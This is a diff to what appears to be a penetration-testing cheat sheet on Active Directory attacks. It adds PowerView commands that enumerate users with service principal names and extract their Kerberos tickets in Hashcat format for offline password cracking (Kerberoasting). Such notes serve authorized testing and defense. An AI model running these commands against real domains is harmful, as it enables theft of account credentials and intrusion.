@@ -88,6 +88,12 @@ The encrypted ticket is taken offline and subjected to password-cracking tools (
 
 ### With PowerView
 
+First search for users with SPN property
+
+    Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName 
+
+Then extract the hash for cracking
+
     Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
 ## LLMNR/NBT-NS Poisoning
